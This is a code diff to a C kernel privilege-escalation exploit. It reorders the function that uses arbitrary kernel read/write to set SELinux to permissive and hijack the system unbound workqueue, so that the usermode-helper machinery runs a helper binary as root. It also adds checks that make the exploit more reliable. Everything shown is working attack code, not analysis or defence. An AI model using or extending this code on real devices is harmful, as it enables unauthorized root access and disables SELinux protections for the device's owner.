@@ -149,6 +149,14 @@ static int install_workqueue_umh_root(int fd) {
     pr_error("root umh helper path too long\n");
     return 0;
   }
+  struct stat helper_stat;
+  if (stat(root_umh_path, &helper_stat) != 0 ||
+      !S_ISREG(helper_stat.st_mode) ||
+      !(helper_stat.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH))) {
+    pr_error("root umh helper is not executable path=%s errno=%d\n",
+             root_umh_path, errno);
+    return 0;
+  }
   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
   snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
   uintptr_t completion_addr =
@@ -173,14 +181,6 @@ static int install_workqueue_umh_root(int fd) {
   umh_data.argv[3] = 0;
   umh_data.envp[0] = 0;
   uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
-
-  unlink(ROOT_SOCKET_PATH);
-  ssize_t selinux_write = kernel_write_data(
-      fd, selinux_addr, &permissive, sizeof(permissive));
-  if (selinux_write != (ssize_t)sizeof(permissive)) {
-    pr_error("root umh selinux write failed ret=%zd\n", selinux_write);
-    return 0;
-  }
 
   uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
   uintptr_t wq = root_read64(fd, wq_slot);
@@ -223,6 +223,17 @@ static int install_workqueue_umh_root(int fd) {
   if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
     pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
              color, refcnt, nr_active, max_active);
+    return 0;
+  }
+
+  /* Validate the workqueue graph and helper before the first privileged
+   * kernel write.  A false-positive pipe read must stop at this point rather
+   * than changing SELinux state and then dereferencing an invalid queue. */
+  unlink(ROOT_SOCKET_PATH);
+  ssize_t selinux_write = kernel_write_data(
+      fd, selinux_addr, &permissive, sizeof(permissive));
+  if (selinux_write != (ssize_t)sizeof(permissive)) {
+    pr_error("root umh selinux write failed ret=%zd\n", selinux_write);
     return 0;
   }
 
